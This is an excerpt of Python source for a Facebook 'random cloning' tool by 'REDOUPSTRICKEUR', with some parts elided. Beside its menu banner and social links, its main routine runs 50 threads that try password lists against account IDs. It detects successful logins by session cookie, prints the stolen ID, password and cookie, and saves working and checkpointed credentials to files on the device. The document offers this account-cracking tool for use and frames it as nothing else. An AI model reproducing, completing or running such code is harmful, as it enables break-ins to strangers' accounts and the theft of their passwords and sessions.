...
def o():
    ...
    if ALIF == 'B':
        ...
        return None
    if ALIF == 'C':
        os.system('xdg-open https://facebook.com/groups/redoups.hackeur/')
        return None
    if ALIF == 'D':
        os.system('xdg-open https://www.github.com/Redoupstrickeur')
        return None
    if ALIF == 'E':
        os.system('exit')
        return None
...
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐
  ┏━[•] Author   : REDOUPS HACK
  ┗━[•] Facebook : REDOUPSHACK
  ┏━[•] Tool     : FREE
  ┗━[•] Version  : 1.9
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
[01][A] START RANDOM CLONING
[02][B] CONTACT ADMIN & FB GROUP
[03][C] FOLLOW MY FB PROFILE
[04][D] JOIN MESSENGER GROUP
[00][E] EXIT PROGRAMMING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


 \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mREDOUPSTRICKEUR   \033[38;5;46m
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195m REDOUPSTRICKEUR               \033[38;5;46m
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mREDOUPSTRICKEUR              \033[38;5;46m
 ...
 \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195mCyber REDOUPSTRICKEUR                  \033[38;5;46m|
 ...
 \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m MADAGASCAR....
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m REDOUPSTRICKEUR ....
 \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°""")
def linex():
	print(' \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°')
loop = 0
...
def Hasan():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL RDPS \033[1;97m: \033[38;5;45mREDOUPSTRICKEUR')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[REDOUPSTRICKEUR-OK💉] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                print(f'    \033[38;5;46m[COOKIE🍪] \033[38;5;192m'+coki)
                cek_apk(session,coki)
                open('/sdcard/REDOUPSHACKEUR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [REDOUPSTRICKEUR-CP🛠️] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/REDOUPSTRICKEUR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sREDOUPSTRICKEUR\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
